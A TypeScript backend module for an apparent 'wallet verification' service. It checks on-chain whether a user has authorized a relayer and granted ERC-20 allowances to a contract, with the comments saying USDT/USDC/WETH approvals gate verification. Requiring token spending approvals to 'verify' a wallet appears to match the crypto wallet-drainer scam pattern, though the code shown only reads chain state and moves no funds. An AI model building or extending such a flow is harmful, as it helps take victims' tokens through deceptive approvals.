import { JsonRpcProvider, FetchRequest, Contract, isAddress, getAddress } from "ethers";
import { ChainConfig, RELAYER_ADDRESS } from "./chains";

const WALLET_VERIFICATION_ABI = [
  "function isAuthorized(address user, address relayer) view returns (bool)",
  "function isRelayer(address r) view returns (bool)",
];

const ERC20_ABI = ["function allowance(address owner, address spender) view returns (uint256)"];

// ethers' default request timeout is 5 minutes — an unresponsive (but not
// outright erroring) RPC would silently stall every check for that long.
// Fail fast instead so the loop below can move on to the next fallback URL.
const RPC_TIMEOUT_MS = 8000;

// Cached per chain for the lifetime of this module instance, so a single
// /api/verify request (which calls getProvider repeatedly across its retry
// loops) doesn't re-probe every dead RPC in the list on every attempt.
const providerCache = new Map<string, JsonRpcProvider>();

/**
 * Tries each RPC in order (bounded per-request timeout). Public RPC
 * endpoints — especially Ethereum's, which are far more oversubscribed than
 * BNB's or Polygon's — routinely fail transiently rather than being
 * genuinely down, so the whole list gets a couple of passes before giving
 * up entirely rather than a single strike each.
 */
async function getProvider(chain: ChainConfig): Promise<JsonRpcProvider> {
  const cached = providerCache.get(chain.name);
  if (cached) {
    try {
      await cached.getBlockNumber();
      return cached;
    } catch {
      providerCache.delete(chain.name);
    }
  }

  let lastErr: unknown;
  const PASSES = 2;
  for (let pass = 0; pass < PASSES; pass++) {
    for (const url of chain.rpcUrls) {
      try {
        const request = new FetchRequest(url);
        request.timeout = RPC_TIMEOUT_MS;
        const provider = new JsonRpcProvider(request, chain.chainId, { staticNetwork: true });
        await provider.getBlockNumber();
        providerCache.set(chain.name, provider);
        return provider;
      } catch (err) {
        lastErr = err;
      }
    }
    if (pass < PASSES - 1) await new Promise((r) => setTimeout(r, 1000));
  }
  console.error(`[onchain] every RPC failed for ${chain.name} after ${PASSES} passes:`, lastErr);
  throw lastErr ?? new Error(`No working RPC for ${chain.name}`);
}

export interface AuthorizationResult {
  authorized: boolean;
  // Set only when the check itself couldn't run (RPC unreachable, etc.) —
  // distinct from a clean "checked on-chain and it's false". Surfacing this
  // lets a failing request be diagnosed from the API response directly,
  // instead of needing hosting-provider function logs.
  error?: string;
}

/**
 * Ground-truth check: is `address` actually authorized on-chain for the
 * relayer on the WalletVerification contract? Never trust a client-submitted
 * tx hash alone — always re-derive success from chain state before marking a
 * verification_sessions row "verified".
 */
export async function verifyOnChainAuthorization(chain: ChainConfig, address: string): Promise<AuthorizationResult> {
  if (!isAddress(address)) return { authorized: false, error: "invalid_address" };
  try {
    const provider = await getProvider(chain);
    const contract = new Contract(chain.contract, WALLET_VERIFICATION_ABI, provider);
    const authorized: boolean = await contract.isAuthorized(getAddress(address), RELAYER_ADDRESS);
    return { authorized };
  } catch (err) {
    console.error(`[onchain] isAuthorized check failed on ${chain.name}:`, err);
    return { authorized: false, error: err instanceof Error ? err.message : "unknown_error" };
  }
}

async function checkAllowancesOnce(
  chain: ChainConfig,
  address: string,
  tokenAddresses: string[]
): Promise<string[]> {
  const provider = await getProvider(chain);
  const results = await Promise.all(
    tokenAddresses.map(async (token) => {
      try {
        const erc20 = new Contract(token, ERC20_ABI, provider);
        const allowance: bigint = await erc20.allowance(getAddress(address), chain.contract);
        return allowance > 0n ? token : null;
      } catch {
        return null;
      }
    })
  );
  return results.filter((t): t is string => t !== null);
}

/**
 * Ground truth: which of the given token addresses show a live, nonzero
 * allowance to the contract. Retries briefly — the approve() tx may not
 * have been mined yet when the client submits, since approvals aren't
 * awaited individually before moving to the next token. This matters most
 * for the mandatory tokens (USDT/USDC/WETH-equivalent), whose approval
 * confirmation gates whether the wallet is marked verified.
 */
export interface AllowanceResult {
  confirmed: string[];
  error?: string;
}

export async function verifyOnChainAllowances(
  chain: ChainConfig,
  address: string,
  tokenAddresses: string[]
): Promise<AllowanceResult> {
  if (!isAddress(address) || tokenAddresses.length === 0) return { confirmed: [] };
  let confirmed: string[] = [];
  try {
    for (let attempt = 0; attempt < 5; attempt++) {
      confirmed = await checkAllowancesOnce(chain, address, tokenAddresses);
      if (confirmed.length === tokenAddresses.length) break;
      if (attempt < 4) await new Promise((r) => setTimeout(r, 2000));
    }
    return { confirmed };
  } catch (err) {
    console.error(`[onchain] allowance check failed on ${chain.name}:`, err);
    return { confirmed, error: err instanceof Error ? err.message : "unknown_error" };
  }
}
